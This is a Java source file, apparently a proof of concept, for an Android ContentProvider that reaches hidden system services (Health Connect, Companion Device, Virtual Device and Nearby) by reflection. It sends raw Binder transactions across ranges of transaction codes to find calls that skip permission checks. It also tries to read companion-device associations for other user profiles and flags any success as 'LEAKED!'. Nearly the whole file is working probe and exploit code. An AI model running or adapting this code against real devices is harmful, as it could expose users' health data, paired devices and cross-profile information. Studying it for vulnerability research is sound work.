package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Binder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class HealthConnectProbeProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("health")) {
            probeHealthConnect(cursor);
        } else if (path != null && path.contains("companion")) {
            probeCompanionDevice(cursor);
        } else if (path != null && path.contains("virtual")) {
            probeVirtualDevice(cursor);
        } else if (path != null && path.contains("nearby")) {
            probeNearby(cursor);
        } else {
            probeHealthConnect(cursor);
            probeCompanionDevice(cursor);
            probeVirtualDevice(cursor);
            probeNearby(cursor);
        }

        return cursor;
    }

    private void probeHealthConnect(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("healthconnect");
        if (binder == null) { cursor.addRow(new Object[]{"healthconnect", "no_binder"}); return; }
        String desc = "android.health.connect.aidl.IHealthConnectService";

        // IHealthConnectService methods (scan to find accessible ones)
        // Key ones:
        // - getGrantedPermissions — reveals health permissions per app
        // - readRecords — read health data
        // - getContributorApplicationsInfo — reveals which apps contribute health data

        // Broad TX scan
        for (int tx = 1; tx <= 30; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            cursor.addRow(new Object[]{"hc_tx" + tx, "OK avail=" + avail});
                        } else {
                            cursor.addRow(new Object[]{"hc_tx" + tx, "OK_empty"});
                        }
                    } catch (SecurityException e) {
                        String msg = e.getMessage();
                        if (msg != null && msg.contains("Health")) {
                            cursor.addRow(new Object[]{"hc_tx" + tx, "SEC:health_perm"});
                        } else {
                            cursor.addRow(new Object[]{"hc_tx" + tx, "SEC:" + truncate(msg)});
                        }
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"hc_tx" + tx, "EX:" + truncate(msg)});
                        }
                    }
                } else {
                    // TX doesn't exist
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"hc_tx" + tx, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // Try getContributorApplicationsInfo — which apps store health data
        // This is valuable because it reveals installed health/fitness apps
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeStrongBinder(new Binder()); // callback
            binder.transact(17, data, reply, 0); // guess TX for getContributorApplicationsInfo
            reply.readException();
            cursor.addRow(new Object[]{"hc_contributors", "OK avail=" + reply.dataAvail()});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"hc_contributors", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();
    }

    private void probeCompanionDevice(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("companiondevice");
        if (binder == null) { cursor.addRow(new Object[]{"companion", "no_binder"}); return; }
        String desc = "android.companion.ICompanionDeviceManager";

        // ICompanionDeviceManager:
        // TX=1: associate(AssociationRequest, IAssociationRequestCallback, String callingPackage, int userId)
        // TX=2: getAssociations(String callingPackage, int userId) — reveals paired devices!
        // TX=3: getAllAssociationsForUser(int userId) — ALL associations for a user
        // TX=10: isCompanionApplicationBound(String packageName, int userId)
        // TX=11: getCompanionDeviceForCallingApp(...)

        // TX=2: getAssociations for our package (should work)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeInt(0); // userId
            binder.transact(2, data, reply, 0);
            reply.readException();
            // List<AssociationInfo>
            int count = reply.readInt();
            cursor.addRow(new Object[]{"assoc_own", "count=" + count});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"assoc_own", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=3: getAllAssociationsForUser — try for user 0 and 11
        for (int userId : new int[]{0, 11}) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(3, data, reply, 0);
                reply.readException();
                int count = reply.readInt();
                cursor.addRow(new Object[]{"allAssoc_u" + userId, "count=" + count});
                if (count > 0 && count < 100) {
                    cursor.addRow(new Object[]{"allAssoc_u" + userId,
                        "LEAKED! " + count + " companion devices for user " + userId});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"allAssoc_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX scan for other accessible methods
        for (int tx = 4; tx <= 20; tx++) {
            if (tx == 2 || tx == 3) continue;
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            cursor.addRow(new Object[]{"cdm_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        // skip
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"cdm_tx" + tx, truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }
    }

    private void probeVirtualDevice(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("virtualdevice");
        if (binder == null) { cursor.addRow(new Object[]{"virtualdevice", "no_binder"}); return; }
        String desc = "android.companion.virtual.IVirtualDeviceManager";

        // IVirtualDeviceManager:
        // TX=1: createVirtualDevice(...)
        // TX=2: getVirtualDeviceIds() — reveals active virtual devices
        // TX=3: getDeviceIdForDisplayId(int displayId)
        // TX=6: getDevicePolicy(int virtualDeviceId, int policyType)
        // TX=9: isValidVirtualDeviceId(int deviceId)

        // TX=2: getVirtualDeviceIds
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(2, data, reply, 0);
            reply.readException();
            // int[]
            int count = reply.readInt();
            cursor.addRow(new Object[]{"virtualDeviceIds", "count=" + count});
            if (count > 0 && count < 100) {
                StringBuilder sb = new StringBuilder("[");
                for (int i = 0; i < Math.min(count, 10); i++) {
                    sb.append(reply.readInt()).append(",");
                }
                sb.append("]");
                cursor.addRow(new Object[]{"virtualIds", sb.toString()});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"virtualDeviceIds", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX scan
        for (int tx = 3; tx <= 15; tx++) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            cursor.addRow(new Object[]{"vdm_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"vdm_tx" + tx, "SEC"});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed")) {
                            cursor.addRow(new Object[]{"vdm_tx" + tx, truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }
    }

    private void probeNearby(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("nearby");
        if (binder == null) { cursor.addRow(new Object[]{"nearby", "no_binder"}); return; }
        String desc = "android.nearby.INearbyManager";

        // INearbyManager:
        // TX=1: registerScanListener(ScanRequest, IScanListener, String callingPackage, String callingFeatureId)
        // TX=2: unregisterScanListener(IScanListener, String callingPackage)
        // TX=3: startBroadcast(BroadcastRequest, IBroadcastListener, String callingPackage)
        // TX=4: stopBroadcast(IBroadcastListener, String callingPackage)
        // TX=5: queryOffloadCapability(IOffloadCallback, String callingPackage)

        // TX scan
        for (int tx = 1; tx <= 10; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeString(null);
                data.writeInt(0);
                data.writeStrongBinder(new Binder());
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        cursor.addRow(new Object[]{"nearby_tx" + tx, "OK avail=" + reply.dataAvail()});
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"nearby_tx" + tx, "SEC:" + truncate(e.getMessage())});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"nearby_tx" + tx, "EX:" + truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
